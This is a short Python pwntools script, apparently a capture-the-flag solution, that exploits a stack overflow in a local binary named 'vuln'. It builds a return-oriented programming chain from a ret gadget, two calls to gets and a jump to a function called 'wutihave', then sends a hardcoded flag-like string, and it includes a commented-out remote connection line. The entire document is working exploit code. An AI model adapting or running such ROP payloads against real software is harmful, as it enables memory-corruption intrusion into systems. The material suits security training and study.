from pwn import *

context.log_level = "debug"

context.binary = elf = ELF("./vuln")
io = elf.process()
# io = remote("localhost", 9999)

rop = ROP(elf)

io.sendline()

payload = p64(rop.find_gadget(["ret"])[0])
payload += p64(elf.sym.gets)
payload += p64(elf.sym.gets)
payload += p64(elf.sym.wutihave)
# payload += p64(elf.sym.leimicc)

io.sendline(payload)
io.sendline(b"")
io.sendline(b"flag`35087a865668b8c4dd423f38cd5a0298")

io.interactive()
